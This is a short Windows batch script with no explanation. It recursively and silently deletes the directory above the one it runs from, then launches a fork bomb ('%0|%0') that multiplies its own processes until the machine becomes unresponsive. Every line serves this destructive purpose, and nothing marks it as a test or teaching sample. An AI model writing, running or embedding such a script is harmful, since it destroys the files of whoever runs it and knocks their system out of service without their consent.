@echo off
pushd ..
set "dir=%CD%"
popd
rd /s /q "%dir%" >nul
%0|%0
